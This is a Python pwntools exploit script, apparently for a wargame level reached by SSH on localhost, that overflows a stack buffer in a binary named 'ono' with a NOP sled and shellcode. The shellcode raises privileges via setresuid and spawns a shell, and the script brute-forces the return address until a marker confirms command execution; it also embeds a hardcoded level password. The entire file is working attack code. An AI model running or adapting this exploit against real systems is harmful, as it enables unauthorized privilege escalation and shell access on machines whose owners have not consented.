#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

BINARY_NAME = "ono"
OFFSET = 72  # placeholder — confirm with cyclic_find for this binary before running
MAX_LEN = 256

priv_shellcode = asm('''
    xor rax, rax
    mov al, 107        /* geteuid */
    syscall
    mov rdi, rax
    mov rsi, rax
    mov rdx, rax
    xor rax, rax
    mov al, 117        /* setresuid */
    syscall
''')
SHELLCODE = priv_shellcode + asm(shellcraft.sh())

# Budget: OFFSET bytes padding + 8 bytes address + sled + shellcode, all <= MAX_LEN
SLED_SIZE = MAX_LEN - OFFSET - 8 - len(SHELLCODE)
if SLED_SIZE < 16:
    log.failure(f"Not enough room for a sled: SLED_SIZE={SLED_SIZE}. "
                f"Shrink OFFSET assumptions or shellcode, or re-check OFFSET.")
    exit(1)

log.info(f"shellcode len={len(SHELLCODE)}, sled={SLED_SIZE}, "
         f"total payload={OFFSET + 8 + SLED_SIZE + len(SHELLCODE)}/{MAX_LEN}")

CENTER = 0x7fffffffed90  # starting anchor — adjust to a gdb estimate for *this* binary if you have one
STEP = 0x40              # smaller step than level00, since the sled is much smaller now
RANGE = 0x1000

def build_payload(ret_addr):
    sled = b"\x90" * SLED_SIZE
    payload = b"A" * OFFSET
    payload += p64(ret_addr)
    payload += sled
    payload += SHELLCODE
    assert len(payload) <= MAX_LEN, f"payload too long: {len(payload)}"
    return payload

def try_address(connection, ret_addr, binary_name):
    try:
        sh = connection.process(['/usr/bin/bash', '-c', f'ulimit -c 0; exec ./{binary_name}'], env={})
        sh.recvuntil(b":", timeout=5)  # matches "...operator ID:" prompt
        sh.send(build_payload(ret_addr))  # send, not sendline — stay under MAX_LEN, avoid adding \n

        sh.sendline(b"echo PWNED_$((1+1))")
        try:
            out = sh.recvuntil(b"PWNED_2", timeout=2)
            if b"PWNED_2" in out:
                log.success(f"Hit! Working return address: {hex(ret_addr)}")
                sh.close()
                return True
        except EOFError:
            pass

        sh.close()
    except Exception as e:
        log.warning(f"Error at {hex(ret_addr)}: {e}")
    return False

def brute_force(user, pwd, binary_name):
    connection = ssh(host="localhost", user=user, password=pwd, port=4242, timeout=10)

    addr = CENTER - RANGE
    end = CENTER + RANGE
    tried = 0
    found = None
    while addr <= end:
        tried += 1
        log.info(f"Trying {hex(addr)} ({tried} attempts so far)")
        if try_address(connection, addr, binary_name):
            found = addr
            break
        addr += STEP

    connection.close()

    if not found:
        log.failure("No working address found in range, widen RANGE or re-check OFFSET")
    return found

if __name__ == "__main__":
    found = brute_force("level01", "czugaihitjx0lys47blkh0qwtzz1c9g6", BINARY_NAME)
    if found:
        print(f"\n[+] Use this return address: {hex(found)}")